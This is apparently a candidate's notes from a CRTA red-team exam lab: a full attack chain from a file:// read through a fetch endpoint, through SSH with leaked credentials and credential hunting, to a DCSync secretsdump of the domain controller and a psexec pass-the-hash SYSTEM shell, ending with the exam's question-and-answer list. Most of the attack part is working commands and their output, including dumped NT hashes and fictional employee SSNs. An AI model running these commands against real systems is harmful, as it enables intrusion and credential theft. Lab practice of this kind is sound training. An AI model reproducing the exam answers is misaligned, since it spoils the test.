Username:

68c7071f478a5ff39f4ae571

Password:

C%FkqM#O

scope:

172.26.10.0/24

## external 
ip:
```sh
172.26.10.11
```

```sh
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

http://172.26.10.11:23100/fetch?url=file:///../../../../../etc/passwd

http://172.26.10.11:23100/fetch?url=file:///hostfs/etc/passwd

```nmap stuff
PORT     STATE    SERVICE       VERSION
3389/tcp filtered ms-wbt-server
23100/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.9.22)
22/tcp   open     ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 32:fb:39:22:8d:0a:cf:1c:a9:01:0b:dd:d6:c9:84:04 (ECDSA)
|_  256 8e:b4:48:f5:1c:f8:39:54:d9:a6:e6:58:87:a7:0d:a4 (ED25519)
```

```sh
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false messagebus:x:101:102::/nonexistent:/usr/sbin/nologin systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin pollinate:x:102:1::/var/cache/pollinate:/bin/false polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin syslog:x:103:104::/nonexistent:/usr/sbin/nologin uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin app-admin:x:1000:1000:@dmin@123:/home/app-admin:/bin/bash dnsmasq:x:999:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin 
```

```sh
ssh app-admin@172.26.10.11 
```

```sh
app-admin:x:1000:1000:@dmin@123:/home/app-admin:/bin/bash 
```

sudo grep -R --color=auto "172.17.0.*" / 2>/dev/null

HOTHOST_WEB_ADMIN_PASSWORD=Very3stroungPassword
HOTHOST_WEB_ADMIN_USERNAME=admin

```sh
app-admin@app-server:~$ find / -name "*.log" 2>/dev/null
/root/.npm/_logs/2025-05-12T08_47_39_282Z-debug-0.log
/root/.npm/_logs/2025-05-12T09_02_46_199Z-debug-0.log
/root/.npm/_logs/2025-05-12T09_01_35_244Z-debug-0.log
/root/.npm/_logs/2025-05-12T08_41_58_497Z-debug-0.log
/root/.npm/_logs/2025-05-12T08_41_18_414Z-debug-0.log
/root/.npm/_logs/2025-05-12T09_02_59_284Z-debug-0.log
/root/.npm/_logs/2025-05-12T10_52_33_885Z-debug-0.log
/root/.npm/_logs/2025-05-12T09_02_07_915Z-debug-0.log
/root/.npm/_logs/2025-05-12T09_01_57_037Z-debug-0.log
/root/.npm/_logs/2025-05-12T08_47_28_499Z-debug-0.log
/root/.npm/_logs/2025-05-12T09_02_14_451Z-debug-0.log
/root/.npm/_logs/2025-05-12T10_52_45_206Z-debug-0.log
/root/lin.log
/www/hothostdata/process/000023.log
/run/initramfs/fsck.log
/run/initramfs/overlayroot.log
/run/cloud-init/cloud-init-generator.log
/run/cloud-init/ds-identify.log
/var/lib/docker/overlay2/42c2f9994effb4768163a3314f7460e76282fe1557f021587c3a1804bd3820e6/merged/root/.npm/_logs/2025-05-12T09_37_38_967Z-debug-0.log
/var/lib/docker/overlay2/780337fa5853d7f84a571050e7533836933f9892f9e623551c02ed135a5b45b9/diff/var/log/dpkg.log
/var/lib/docker/overlay2/780337fa5853d7f84a571050e7533836933f9892f9e623551c02ed135a5b45b9/diff/var/log/apt/term.log
/var/lib/docker/overlay2/780337fa5853d7f84a571050e7533836933f9892f9e623551c02ed135a5b45b9/diff/var/log/apt/history.log
/var/lib/docker/overlay2/780337fa5853d7f84a571050e7533836933f9892f9e623551c02ed135a5b45b9/diff/var/log/alternatives.log
/var/lib/docker/overlay2/bccb43f06f991c7a689883b7858126b2246b6736b0ef940c94cdcfe2d9931874/merged/var/log/apt/term.log
/var/lib/docker/overlay2/bccb43f06f991c7a689883b7858126b2246b6736b0ef940c94cdcfe2d9931874/merged/var/log/apt/history.log
/var/lib/docker/overlay2/bccb43f06f991c7a689883b7858126b2246b6736b0ef940c94cdcfe2d9931874/merged/var/log/dpkg.log
/var/lib/docker/overlay2/bccb43f06f991c7a689883b7858126b2246b6736b0ef940c94cdcfe2d9931874/merged/var/log/alternatives.log
/var/lib/docker/overlay2/ffa96fddf967ba702028964de21cda4bb0a91c7327105db323f29def7604461e/diff/var/log/dpkg.log
/var/lib/docker/overlay2/ffa96fddf967ba702028964de21cda4bb0a91c7327105db323f29def7604461e/diff/var/log/apt/term.log
/var/lib/docker/overlay2/ffa96fddf967ba702028964de21cda4bb0a91c7327105db323f29def7604461e/diff/var/log/apt/history.log
/var/lib/docker/overlay2/9c7c1aeab1cc3b4f6f05219791d7ae0270666c0cc870afe90a4a72a3d9f6422e/diff/root/.npm/_logs/2025-05-12T09_26_23_983Z-debug-0.log
/var/lib/docker/overlay2/1d937d8a0e70ad59eb999eadff802cdd18971b6b5216675f6b282a2b7e4eb463/diff/root/.npm/_logs/2025-05-01T15_19_31_873Z-debug-0.log
/var/lib/docker/overlay2/9266b3948ef7d8a1216a4157790bdfae2455daa414c78e8d8c92271c72402c24/diff/var/log/dpkg.log
/var/lib/docker/overlay2/9266b3948ef7d8a1216a4157790bdfae2455daa414c78e8d8c92271c72402c24/diff/var/log/apt/term.log
/var/lib/docker/overlay2/9266b3948ef7d8a1216a4157790bdfae2455daa414c78e8d8c92271c72402c24/diff/var/log/apt/history.log
/var/lib/docker/overlay2/9266b3948ef7d8a1216a4157790bdfae2455daa414c78e8d8c92271c72402c24/diff/var/log/alternatives.log
/var/lib/docker/overlay2/4db81a3d0a5bbd711b162ac65d73b51bf7ea9768d40b7a966325074b5d71f587/diff/var/log/dpkg.log
/var/lib/docker/overlay2/4db81a3d0a5bbd711b162ac65d73b51bf7ea9768d40b7a966325074b5d71f587/diff/var/log/apt/term.log
/var/lib/docker/overlay2/4db81a3d0a5bbd711b162ac65d73b51bf7ea9768d40b7a966325074b5d71f587/diff/var/log/apt/history.log
/var/lib/docker/overlay2/f2fb37ca227b45a50943075e989b1c2552340810333861d6bebfcaffaa654d2a/diff/root/.npm/_logs/2023-08-10T17_28_01_543Z-debug-0.log
/var/lib/docker/overlay2/2f400f5fa0a16561b0495a4fe049d04f2f5bd76951e7e77efe4f0acc6bbbd963/diff/root/.npm/_logs/2025-05-12T09_37_38_967Z-debug-0.log
/var/lib/docker/overlay2/6ac2995afbd0079e50c81993166be79f92e2e0e9351650aa484c963b36904ba3/diff/root/.npm/_logs/2025-05-01T14_32_50_368Z-debug-0.log
/var/lib/docker/overlay2/1db60beb9beda87d9aa9fe9e8099cb7aee7f133a0f68cfc88f2e06fbca2ba45e/diff/root/.npm/_logs/2025-05-12T09_06_05_149Z-debug-0.log
/var/lib/docker/overlay2/f2d49efd1b8698efe99b8392fe446f3838334d5f7fc571e0c8351e2cf50ef9f5/diff/root/.npm/_logs/2025-05-12T09_20_05_941Z-debug-0.log
/var/lib/docker/overlay2/6f87ea28c8195ebecdb9ac2b29d838697814d907141c49804c92cc321fe908d6/diff/root/.npm/_logs/2025-05-01T15_24_54_407Z-debug-0.log
/var/lib/docker/overlay2/d06228efe7b8e065ff0520721c0406db3f5ffc9032fb53b23d26ef2e5b0284fb/diff/root/.npm/_logs/2025-05-12T09_37_22_717Z-debug-0.log
/var/lib/docker/overlay2/16fc7a47efadaa17a277ddfd68d6259a273af52ea0d9d9dac266ce9725201476/diff/root/.npm/_logs/2025-05-12T09_37_32_399Z-debug-0.log
/var/lib/docker/overlay2/5834a5066fb7f0de3c0d609e7e388dc218abcafbbee9ac9171b06cb4e42663e5/diff/root/.npm/_logs/2025-05-01T15_13_30_927Z-debug-0.log
/var/lib/docker/containers/55076b4e68de8995f1654edde84e71d7fe33a8e0efb3f0aba75cbdb2d48d8b75/55076b4e68de8995f1654edde84e71d7fe33a8e0efb3f0aba75cbdb2d48d8b75-json.log
/var/lib/docker/containers/63bebe4fbd434e078e008294d852e0c48cf299a182857d04cd9e2bb0286681b8/63bebe4fbd434e078e008294d852e0c48cf299a182857d04cd9e2bb0286681b8-json.log
/var/lib/docker/containers/45b67dc6c26a86934c837e77e2c2bc9aff32ce65e1667799beb9e9d754373c16/45b67dc6c26a86934c837e77e2c2bc9aff32ce65e1667799beb9e9d754373c16-json.log
/var/lib/docker/containers/c1afed8135b129613b0091ab086336a8256de109dda478e4f658d49cdfbca1ed/c1afed8135b129613b0091ab086336a8256de109dda478e4f658d49cdfbca1ed-json.log
/var/lib/docker/containers/51e051aedd24383b38ad3fba2f0be8c4e0b2d6a87ad7138f0656074c3088a838/51e051aedd24383b38ad3fba2f0be8c4e0b2d6a87ad7138f0656074c3088a838-json.log
/var/lib/docker/containers/efd661f35cd34a7c0a291215fb30cda836180948ab9e86fcdc5a9e5b6d9d624d/efd661f35cd34a7c0a291215fb30cda836180948ab9e86fcdc5a9e5b6d9d624d-json.log
/var/lib/docker/containers/80a14ab1994fec748ffe60e2f28c723ddfc46cf7266923a464a8487e1c1a49d6/80a14ab1994fec748ffe60e2f28c723ddfc46cf7266923a464a8487e1c1a49d6-json.log
/var/lib/docker/containers/8b9b917197037db868ae3b4d7c3f27d3c6307d0c74196356cd59b7869fdd9fee/8b9b917197037db868ae3b4d7c3f27d3c6307d0c74196356cd59b7869fdd9fee-json.log
/var/lib/docker/containers/dbfe85340aa80ecd23fcce04cb924c9e40dec7d55af13605ca5b87903a9e8791/dbfe85340aa80ecd23fcce04cb924c9e40dec7d55af13605ca5b87903a9e8791-json.log
/var/lib/docker/containers/9fe9c120f6959187f44fd6ac9ebf103eab57d0ef5c7c151b95b633fecdb962b7/9fe9c120f6959187f44fd6ac9ebf103eab57d0ef5c7c151b95b633fecdb962b7-json.log
/var/lib/docker/containers/49792c71b3c12624bfe174a14ad943ffd03d087a7737507d6b8afa3abde115c6/49792c71b3c12624bfe174a14ad943ffd03d087a7737507d6b8afa3abde115c6-json.log
/var/lib/docker/containers/30d27abd67cce75295e6b97d2922cc1130b643e23041f1610c3f07353b9f31b8/30d27abd67cce75295e6b97d2922cc1130b643e23041f1610c3f07353b9f31b8-json.log
/var/lib/docker/containers/54e94a452c287b08a6de1a1763a4394a398d9024eacf35035251c2238fc60cbd/54e94a452c287b08a6de1a1763a4394a398d9024eacf35035251c2238fc60cbd-json.log
/var/lib/docker/containers/c0385e7eba24ca3c033fc82a063d4c811ce053dc41f013ae9f3eb6185dbee2b3/c0385e7eba24ca3c033fc82a063d4c811ce053dc41f013ae9f3eb6185dbee2b3-json.log
/var/lib/docker/containers/0e14fdd012846e6e163a52c45e21975c731f7a26756e990a9c547249398aa977/0e14fdd012846e6e163a52c45e21975c731f7a26756e990a9c547249398aa977-json.log
/var/lib/docker/containers/63f2da1bcfd68b2e388b25cfa1a03c777a5f3d141fc7642f1b1dd2546698026a/63f2da1bcfd68b2e388b25cfa1a03c777a5f3d141fc7642f1b1dd2546698026a-json.log
/var/lib/docker/containers/00f1dd456da626fa95f967dfc5fcdb91dde894344e60e2996a443bcf093c9b29/00f1dd456da626fa95f967dfc5fcdb91dde894344e60e2996a443bcf093c9b29-json.log
/var/lib/docker/containers/2e1b51084971256dffdfdc3c25ca9ac9fb0a7605e7cbc7b8c8054d58a44db6b0/2e1b51084971256dffdfdc3c25ca9ac9fb0a7605e7cbc7b8c8054d58a44db6b0-json.log
/var/lib/docker/containers/c99628067a551b804aacd582de9ecb049566438cd09d1c5b7ff2f503b85b003c/c99628067a551b804aacd582de9ecb049566438cd09d1c5b7ff2f503b85b003c-json.log
/var/lib/docker/containers/71d3c4d534f9b4798abc0b002f0c25bc77caa200ce7a20400d2432672d5b3dc3/71d3c4d534f9b4798abc0b002f0c25bc77caa200ce7a20400d2432672d5b3dc3-json.log
/var/lib/docker/containers/289cd7f9c62f92e2cd139fd6937e9c78234ff2d772aa93c680feec1a59652ec8/289cd7f9c62f92e2cd139fd6937e9c78234ff2d772aa93c680feec1a59652ec8-json.log
/var/lib/docker/containers/44071ad36b49e49b3818b18c64c08bda3297c595b90346b8bc0244aef48f2418/44071ad36b49e49b3818b18c64c08bda3297c595b90346b8bc0244aef48f2418-json.log
/var/lib/docker/containers/1966cbf6f0e9fd1aa92ac9bd44288be976617fc82bb094f7dbde80863a324498/1966cbf6f0e9fd1aa92ac9bd44288be976617fc82bb094f7dbde80863a324498-json.log
/var/lib/docker/containers/9c17693bfbc89ad85486e332df0e01a11eac2b36ef516d02c46f6021218e212b/9c17693bfbc89ad85486e332df0e01a11eac2b36ef516d02c46f6021218e212b-json.log
/var/lib/docker/containers/2dbbb89770774092449b489335358c4a763f311c47737a5dd237e1c64fe85923/2dbbb89770774092449b489335358c4a763f311c47737a5dd237e1c64fe85923-json.log
/var/lib/docker/containers/8c9b9fc8a67d6d29894e30da9b0857f00ccb34f973fbafd95641129676ee01fe/8c9b9fc8a67d6d29894e30da9b0857f00ccb34f973fbafd95641129676ee01fe-json.log
/var/lib/docker/containers/cbfc88df578e10abf02393581e421db5ea5fe87f0d41dc7ce1a2af36ae888317/cbfc88df578e10abf02393581e421db5ea5fe87f0d41dc7ce1a2af36ae888317-json.log
/var/lib/docker/containers/0a4b1f1e4b7e2e850c64e3e596e78337226ccc1e78f3a241b3bf0866e1bf295c/0a4b1f1e4b7e2e850c64e3e596e78337226ccc1e78f3a241b3bf0866e1bf295c-json.log
/var/lib/docker/containers/dcbd090cb23564226fc1fee767ed148422a803363c142f52ec559ff2b2793c67/dcbd090cb23564226fc1fee767ed148422a803363c142f52ec559ff2b2793c67-json.log
/var/lib/docker/containers/a5eaa13ef93bab162cb4cfd9b3a57a442eb7f7e3c4bf962ff5ba4e7a800c6769/a5eaa13ef93bab162cb4cfd9b3a57a442eb7f7e3c4bf962ff5ba4e7a800c6769-json.log
/var/log/vmware-network.5.log
/var/log/dpkg.log
/var/log/auth.log
/var/log/bootstrap.log
/var/log/apport.log
/var/log/vmware-network.1.log
/var/log/vmware-vmsvc-root.1.log
/var/log/apt/term.log
/var/log/apt/history.log
/var/log/kern.log
/var/log/vmware-network.3.log
/var/log/unattended-upgrades/unattended-upgrades-dpkg.log
/var/log/unattended-upgrades/unattended-upgrades-shutdown.log
/var/log/unattended-upgrades/unattended-upgrades.log
/var/log/vmware-network.2.log
/var/log/vmware-network.9.log
/var/log/cloud-init.log
/var/log/vmware-network.log
/var/log/vmware-network.7.log
/var/log/vmware-network.4.log
/var/log/vmware-vmtoolsd-root.log
/var/log/landscape/sysinfo.log
/var/log/vmware-vmsvc-root.3.log
/var/log/vmware-network.6.log
/var/log/alternatives.log
/var/log/vmware-vmsvc-root.2.log
/var/log/vmware-network.8.log
/var/log/vmware-vmsvc-root.log
/var/log/installer/curtin-install.log
/var/log/installer/subiquity-server-info.log
/var/log/installer/subiquity-server-debug.log
/var/log/installer/subiquity-client-info.log
/var/log/installer/cloud-init.log
/var/log/installer/subiquity-client-debug.log
/var/log/installer/block/discover.log
/var/log/installer/cloud-init-output.log
/var/log/cloud-init-output.log



find / -type f -name '*.log' -exec cat {} +
```

-namespace moby -id 30d27abd67cce75295
2.4.58

```json
root@app-server:~/hot/server# cat /www/hothostdata/hothost.json
{
  "users": [
    {
      "id": "07643590-1aea-4de3-91ec-8881600cc54c",
      "username": "admin",
      "password": "665a26fad71ea9ef3edf5f33195d4b31",
      "createdAt": "Mon May 12 2025"
    }
  ],
  "monitoringData": [],
  "httpMonitoringData": [],
  "settings": {
    "RAM_THRESHOLD": 90,
    "RAM_STABILIZATION_LEVEL": 3,
    "DISK_THRESHOLD": 90,
    "DISK_STABILIZATION_LEVEL": 1,
    "HOST_IS_DOWN_CONFIRMATIONS": 1,
    "HTTP_ISSUE_CONFIRMATION": 1,
    "DAYS_FOR_SSL_EXPIRED": 14,
    "HOURS_FOR_NEXT_ALERT": 12
  },
  "pluginSettings": []

```

```sh
10.10.10.20
10.10.10.100
```

```sh
sudo find / -type f -exec grep -H "http://10.10" {} \; 2>/dev/null
```

Purpose: Password synchronization between on-prem AD and cloud services (Azure AD Connect).

http://10.10.10.20/elfinder/files/AD_Resources.txt
```txt
#Active Directory Sync Service Credentials:

Purpose: Password synchronization between on-prem AD and cloud services (Azure AD Connect).
Service Account: sync_user@ent.corp
Password: Summer@2025

#Security Notes:
  Syncs password hashes to Azure AD (if hybrid environment).
  Critical: Restrict to least privilege (e.g., deny interactive login).
```
Service Account: sync_user@ent.corp
Password: Summer@2025

```sh
crackmapexec smb internal/targets.txt -u sync_user@ent.corp -p "Summer@2025"
```

```sh
psexec.py 'ent.corp/sync_user:Summer@2025@child.warfare.corp'
```

```sh
SMB         10.10.10.100    445    ENT-DC           [*] Windows Server 2022 Build 20348 x64 (name:ENT-DC) (domain:ent.corp) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    ENT-DC           [+] ent.corp\sync_user:Summer@2025 
```

```sh
╭─[~/projects/CRTA/exam]─[root@DEMONDAYZ]─[0]─[5412]
╰─[:)] # crackmapexec smb 10.10.10.100 -u ent.corp\sync_user -p passes.txt 
SMB         10.10.10.100    445    ENT-DC           [*] Windows Server 2022 Build 20348 x64 (name:ENT-DC) (domain:ent.corp) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    ENT-DC           [-] ent.corp\ent.corpsync_user:Summer@2025 STATUS_LOGON_FAILURE 
SMB         10.10.10.100    445    ENT-DC           [-] ent.corp\ent.corpsync_user:Very3stroungPassword STATUS_LOGON_FAILURE 
```

```sh
secretsdump.py ent.corp/sync_user:Summer@2025@10.10.10.100
/root/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3d15cb1141d579823f8bb08f1f23e316:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:36405f88da713c31bbff52e57aea1f86:::
ent.corp\sync_user:1103:aad3b435b51404eeaad3b435b51404ee:e58b89915ba50f299b4bb10325894f91:::
ENT-DC$:1000:aad3b435b51404eeaad3b435b51404ee:0552618a5a8ca779421c3696516c53c2:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:992f0f89c2eec235f94d01103043a3626f1a54e5adc45280ebe58d0883dc294e
Administrator:aes128-cts-hmac-sha1-96:c3c88d0395d8c7e93039108279fa3cb9
Administrator:des-cbc-md5:ad9de62585018c5b
krbtgt:aes256-cts-hmac-sha1-96:1b161ecb048ed49498658525fea07d4278aeab4c8d60ee32e6a61392d14ec924
krbtgt:aes128-cts-hmac-sha1-96:61a3167db44973b38e6ea0ddb9f3f07d
krbtgt:des-cbc-md5:37ad9e49e3ea0b52
ent.corp\sync_user:aes256-cts-hmac-sha1-96:73ae7f5121e08ef5224bf82c941db87bf14ce5bf0bc3c0805b95485885db511f
ent.corp\sync_user:aes128-cts-hmac-sha1-96:72f6b128b62adb5cf0347e8655f41afc
ent.corp\sync_user:des-cbc-md5:377615f8b9106445
ENT-DC$:aes256-cts-hmac-sha1-96:b03d84d867908fef2fa40fe6e50c1c59eae2faf8c00d0ffbec7e592a8a3365e8
ENT-DC$:aes128-cts-hmac-sha1-96:1f550e0fa861676ee501dfa0dcea704e
ENT-DC$:des-cbc-md5:d049191a4f9ed067
[*] Cleaning up...
```

```sh
psexec.py ent.corp/Administrator@10.10.10.100 -hashes aad3b435b51404eeaad3b435b51404ee:3d15cb1141d579823f8bb08f1f23e316
/root/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file woTabqHS.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service PNXI on 10.10.10.100.....
[*] Starting service PNXI.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.643]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

```sh
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is D07F-717D

 Directory of C:\Users\Administrator\Desktop

05/19/2025  04:57 AM    <DIR>          .
06/02/2025  01:52 AM    <DIR>          ..
05/19/2025  05:02 AM             1,553 secret.xml.txt
               1 File(s)          1,553 bytes
               2 Dir(s)  13,909,872,640 bytes free

C:\Users\Administrator\Desktop> type secret.xml.txt
<?xml version="1.0" encoding="UTF-8"?>
<Employees>
  <!-- PROTECTED: Contains sensitive employee information - RESTRICT ACCESS -->
  <Employee security-clearance="confidential">
    <ID>E-4281</ID>
    <FullName>Christopher A. Whitaker</FullName>
    <GovernmentID type="SSN">550-12-8421</GovernmentID>
    <Position>Lead Security Architect</Position>
    <Compensation>
      <BaseSalary currency="USD">142000</BaseSalary>
      <Bonus eligibility="true">15000</Bonus>
    </Compensation>
    <AccessCredentials>
      <SSHKeys>
        <RSA-4096>
          <Fingerprint>SHA256:zT4Gp2K9...V3jH91</Fingerprint>
          <PublicKey>ssh-rsa AAAAB3Nza...9Px8= secure-shell@corp</PublicKey>
          <LastRotated>2024-03-15T08:42:11Z</LastRotated>
        </RSA-4096>
      </SSHKeys>
      <LastMultiFactorAuth>2024-05-20T14:22:07Z</LastMultiFactorAuth>
    </AccessCredentials>
  </Employee>
  
  <Employee security-clearance="restricted">
    <ID>E-9173</ID>
    <FullName>Danielle M. Chen</FullName>
    <GovernmentID type="SSN">367-88-4102</GovernmentID>
    <Position>Director of Engineering</Position>
    <Compensation>
      <BaseSalary currency="USD">189500</BaseSalary>
      <Equity>2500</Equity>
    </Compensation>
    <AccessCredentials>
      <SSHKeys>
        <Ed25519>
          <Fingerprint>SHA256:7bNq1Rc...YtF62</Fingerprint>
          <PublicKey>ssh-ed25519 AAAAC3N...Vdv2= admin-access@corp</PublicKey>
        </Ed25519>
      </SSHKeys>
    </AccessCredentials>
  </Employee>
</Employees>
```

## TGT forging
- admin/sys priv on child dc
- krbtgt hash 
	- nt
	- aes_key 
- SID 
	- child 
	- parent 















### questions:
```
TCP port of the Initial access machine which hosts monitoring software
8091
Completed

Web directory with which reveals sensitive information (Example : Case sensitive)
assets

Base64 hash of db-pass credentials
REJfUEBzc3cwcmQh

Working password of “HotHost” web application
Very3stroungPassword
Completed

Web application route which reveals the system files (Example : /route, do not include forward slash)
pug

What is the “secretToken” string which is present in the above route (Example : Case sensitive)
Monitor the system files

Payload through which hosts system “passwd” file can be read (Example : file:///location/passwd)
file:///hostfs/etc/passwd
Completed

Discovered credentials of “app-admin”
@dmin@123
Completed

Commands that “app-admin” can run on the initial access machine (Example : Mention exact path like /etc/passwd)
/usr/bin/vi
Completed

IP Address discovered from the log file
10.10.10.20
Completed

The service version name running on web port on the discovered ip address (Enter the version only : 3.2.1)
2.4.58
Completed

Complete URL which reveals sync_user credentials (Example : http://IP/location/file.txt, Case sensitive))
http://10.10.10.20/elfinder/files/AD_Resources.txt

What is the password of the sync_user
Summer@2025

What is the Domain Controller IP Address
10.10.10.100
Completed

What is the krbtgt account NT hash of the domain
36405f88da713c31bbff52e57aea1f86

Directory location in the domain controller which contains the sensitive xml file (Example : C:\Windows\System32)


What is the base salary of the user with the position “Director of Engineering”

```
